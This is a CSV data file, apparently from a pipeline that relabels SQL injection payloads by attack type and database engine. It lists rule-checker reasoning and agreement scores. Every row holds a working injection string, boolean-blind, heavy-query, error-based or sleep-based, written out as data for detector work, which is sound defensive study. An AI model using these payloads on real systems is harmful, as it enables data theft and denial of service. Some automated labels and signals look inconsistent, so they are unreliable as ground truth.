payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals,sources_agree
"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'ppwh' = 'ppwh",boolean_blind,generic,1.0,"Pattern match: 'and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'ppwh' = 'ppwh' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'ppwh' = 'ppwh",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1' where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",boolean_blind,mysql,0.85,"Pattern match: 'or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'concat'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,mysql,0.85,"Pattern match: 'or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'concat'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),2
"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp",boolean_blind,generic,1.0,"Pattern match: 'and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
1'|| ( select 'xhcr' from dual where 9279 = 9279,boolean_blind,oracle,0.85,Agreement on boolean_blind injection targetting oracle based on multi-source analysis.,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,oracle,1'|| ( select 'xhcr' from dual where 9279 = 9279,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,2
"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,1.0,"Pattern match: 'and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""wtkx"" = ""wtkx",boolean_blind,generic,1.0,"Pattern match: 'and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""wtkx"" = ""wtkx' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""wtkx"" = ""wtkx",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof",boolean_blind,mysql,0.85,"Pattern match: 'or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'updatexml'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),2
"1 ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,"Pattern match: 'and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'cpfn' like 'cpfn",boolean_blind,generic,1.0,"Pattern match: 'or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'cpfn' like 'cpfn' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'cpfn' like 'cpfn",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1"" ) ) as gawq where 4728 = 4728 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,1.0,"Pattern match: 'or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --' -> boolean_blind (P3); DB signature: db2. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'sysibm.systables'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1"" ) ) as gawq where 4728 = 4728 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,3
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",boolean_blind,db2,0.85,Agreement on boolean_blind injection targetting db2 based on multi-source analysis.,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,2
-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,boolean_blind,oracle,0.85,Agreement on boolean_blind injection targetting oracle based on multi-source analysis.,RELABEL,type='unknown' needs verification; rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,oracle,-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,2
"1 ) ) as tuxy where 6855 = 6855 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,1.0,"Pattern match: 'or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1 ) ) as tuxy where 6855 = 6855 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
1'|| ( select 'vxfx' where 7038 = 7038 and 9306 = 4187 ) ||',boolean_blind,generic,1.0,"Pattern match: 'and 9306 = 4187 ) ||'' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,type='unknown' needs verification; confidence too low (0.60); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'unknown' (P99),boolean_blind,generic,1'|| ( select 'vxfx' where 7038 = 7038 and 9306 = 4187 ) ||',False,0,boolean_blind,generic,Pattern match: 'and 9306 = 4187' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",3
"1 ) as iupg where 2861 = 2861 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,"Pattern match: 'or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) as iupg where 2861 = 2861 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""ampn"" like ""ampn",boolean_blind,generic,1.0,"Pattern match: 'or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""ampn"" like ""ampn' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""ampn"" like ""ampn",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1%"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,boolean_blind,generic,1.0,"Pattern match: 'and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = ""' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1%"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1%' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Pattern match: 'and elt ( 3114 = 3114,sleep ( 5 ) ) #' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'elt'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1%' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,2
"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"Pattern match: 'and elt ( 3114 = 3114,sleep ( 5 ) ) #' -> boolean_blind (P3); DB signature: mysql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'elt'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1%"" and elt ( 3114 = 3114,sleep ( 5 ) ) #",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,2
"1"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,1.0,"Pattern match: 'or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --' -> boolean_blind (P3); DB signature: generic. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1"" ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,3
"1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",boolean_blind,mssql,1.0,"Pattern match: 'case when' -> boolean_blind (P3); DB signature: mssql. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'master..'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mssql,"1, ( select ( case when ( 2106 = 2106 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 2106* ( select 2106 from master..sysdatabases ) end ) )",False,0,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,3
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""%"" = """,boolean_blind,firebird,1.0,"Pattern match: 'and ( ( ""%"" = ""' -> boolean_blind (P3); DB signature: firebird. boolean condition (AND/OR, RLIKE, ELT, IF, CASE) detected in payload. DB-specific token found: 'rdb$'.",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""%"" = """,False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,3
